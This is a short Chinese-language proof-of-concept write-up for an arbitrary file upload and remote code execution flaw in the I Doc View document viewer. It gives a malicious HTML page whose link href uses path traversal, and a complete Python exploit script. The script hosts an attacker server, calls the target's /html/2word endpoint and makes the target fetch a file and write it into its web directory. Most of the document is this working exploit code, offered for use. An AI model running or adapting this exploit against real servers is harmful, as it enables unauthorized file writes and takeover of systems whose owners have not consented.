
## I Doc View任意文件上传漏洞
I DOC VIEW是一个在线的文档查看器，其中的/html/2word接口因为处理不当，导致可以远程读取任意文件，通过这个接口导致服务器下载恶意的JSP进行解析，从而RCE。

## POC构造
流程：携带恶意link[href]的html -> 远程获取  -> 解析出href -> 远程获取恶意文件

poc.html
```html

<!DOCTYPE html>
<html lang="en">
<head>
    <title>test</title>  
</head>
<body>
  <link href="/..\..\..\docview\poc.jsp">
</body>
</html>
```
然后构造 `..\..\..\docview\poc.jsp`  这个是文件
![image](https://github.com/wy876/POC/assets/139549762/736f7c0a-4f06-4170-805a-cf1580b69de3)

![image](https://github.com/wy876/POC/assets/139549762/73ab1c2a-ad91-40a3-96b0-0ca978fa9abe)

## 利用脚本
```python
import http.server
import socketserver
import sys
import threading
import requests

visited_pages = {'/': False, '/..\..\..\docview\poc.jsp': False}

class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        global visited_pages
        if self.path in visited_pages:
            visited_pages[self.path] = True

            if all(visited_pages.values()):
                print("Success! Go to http://{}:{}/poc.jsp".format(remote_ip,remote_port))
                threading.Thread(target=server.shutdown).start()

        if self.path == '/':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html = f'''<html>
<head><title>Index Page</title></head>
<body>
    <link href="http://{ip_address}:{port}/..\..\..\docview\poc.jsp">
</body>
</html>'''
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/..\..\..\docview\poc.jsp':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body><h1>Poc Works!</h1></body></html>")
        else:
            self.send_error(404, "File not found")

    def log_message(self, format, *args):
        return

def send_request_to_remote():
    remote_url = f'http://{remote_ip}:{remote_port}/html/2word?url={ip_address}:{port}'
    try:
        response = requests.get(remote_url)
    except Exception as e:
        pass

if len(sys.argv) < 5:
    print("Usage: python script.py <IP_ADDRESS> <PORT> <REMOTE_IP> <REMOTE_PORT>")
    sys.exit(1)

ip_address = sys.argv[1]
port = int(sys.argv[2])
remote_ip = sys.argv[3]
remote_port = sys.argv[4]

def start_server():
    global server
    server = socketserver.TCPServer((ip_address, port), MyHttpRequestHandler)
    server.serve_forever()

server_thread = threading.Thread(target=start_server)
server_thread.start()

send_request_to_remote()
```
## 漏洞分析
```
https://mp.weixin.qq.com/s/lDqhDnZGXoRyp2IolQ2odg
https://mp.weixin.qq.com/s/mD4EcVmJ9QPmmMLh6KrZ0g
```
